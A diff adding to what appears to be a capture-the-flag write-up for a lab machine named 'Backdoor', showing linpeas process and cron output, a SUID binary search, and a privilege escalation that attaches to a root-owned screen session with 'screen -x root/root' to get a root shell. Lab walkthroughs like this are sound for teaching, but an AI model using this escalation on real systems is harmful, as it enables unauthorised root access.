@@ -571,7 +571,80 @@ strings Not Found
 -rwsr-xr-x 1 root root 52K Jul 14  2021 /usr/bin/chsh
 -rwsr-xr-x 1 root root 31K May 26  2021 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
 ```
+More Linpeas exerts 
+``` console
+══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════      
+                          ╚════════════════════════════════════════════════╝                                
+╔══════════╣ Cleaned processes
+╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                                  
+root           1  0.0  0.5 103784 11356 ?        Ss   02:07   0:03 /sbin/init auto automatic-ubiquity noprompt
+root         486  0.0  0.5  62504 10812 ?        S<s  02:07   0:02 /lib/systemd/systemd-journald
+root         512  0.0  0.2  21236  5340 ?        Ss   02:07   0:01 /lib/systemd/systemd-udevd
+systemd+     524  0.0  0.3  18408  7548 ?        Ss   02:07   0:00 /lib/systemd/systemd-networkd
+  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
+root         659  0.0  0.9 345816 18220 ?        SLsl 02:07   0:02 /sbin/multipathd -d -s
+systemd+     683  0.0  0.6  23896 12196 ?        Ss   02:07   0:00 /lib/systemd/systemd-resolved
+systemd+     685  0.0  0.3  90228  6076 ?        Ssl  02:07   0:00 /lib/systemd/systemd-timesyncd
+  └─(Caps) 0x0000000002000000=cap_sys_time
+root         701  0.0  0.5  47540 10356 ?        Ss   02:07   0:00 /usr/bin/VGAuthService
+root         702  0.1  0.4 311500  8196 ?        Ssl  02:07   0:06 /usr/bin/vmtoolsd
+root         754  0.0  0.3 235564  7288 ?        Ssl  02:07   0:00 /usr/lib/accountsservice/accounts-daemon
+message+     755  0.0  0.2   7596  4688 ?        Ss   02:07   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+  └─(Caps) 0x0000000020000000=cap_audit_write
+root         763  0.0  0.1  81960  3716 ?        Ssl  02:07   0:00 /usr/sbin/irqbalance --foreground
+root         768  0.0  0.9  28996 18120 ?        Ss   02:07   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+syslog       769  0.0  0.2 224348  5396 ?        Ssl  02:07   0:00 /usr/sbin/rsyslogd -n -iNONE
+root         771  0.0  0.3  16704  7616 ?        Ss   02:07   0:00 /lib/systemd/systemd-logind
+root         810  0.0  0.1   6812  2992 ?        Ss   02:07   0:00 /usr/sbin/cron -f
+root         814  0.0  0.1   8352  3440 ?        S    02:07   0:00  _ /usr/sbin/CRON -f
+root         851  0.0  0.0   2608  1800 ?        Ss   02:07   0:00  |   _ /bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
+root       33157  0.0  0.1   8404  3868 ?        S    03:01   0:00  |       _ su user -c cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;
+user       33182  0.0  0.1   6892  3316 ?        Ss   03:01   0:00  |           _ bash -c cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;
+user       33184  0.0  0.1  11844  3500 ?        S    03:01   0:00  |               _ gdbserver --once 0.0.0.0:1337 /bin/true
+user       33189  0.0  0.0    376     4 ?        t    03:01   0:00  |                   _ /bin/true
+root         815  0.0  0.1   8352  3440 ?        S    02:07   0:00  _ /usr/sbin/CRON -f
+root         852  0.0  0.0   2608  1660 ?        Ss   02:07   0:02      _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done
+```
+Confirming a bit more i do a search for binary permissions 
 
+``` console
+user@Backdoor:/home/user$ find / -perm -4000 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/fusermount
+/usr/bin/screen
+/usr/bin/umount
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/pkexec
+user@Backdoor:/home/us
+```
+``` console
+running ls -l
 
+-rwxr-xr-x 1 root   root      63824 May  3  2019  sbverify
+-rwxr-xr-x 1 root   root     117040 Jul 23  2021  scp
+-rwsr-xr-x 1 root   root     474280 Feb 23  2021  screen
+-rwxr-xr-x 1 root   root      14328 May  9  2019  screendump
+```
+
+we see screen can be ran by anyone and it has shown up in linpeas. Lets investigate this more. Ensure that you stabolize the shell and run export TERM=term or the privledge escalation will not work. 
+
+``` console
+screen -x root/root
+
+root@Backdoor:~# whoami
+whoami
+root
+```
 
 
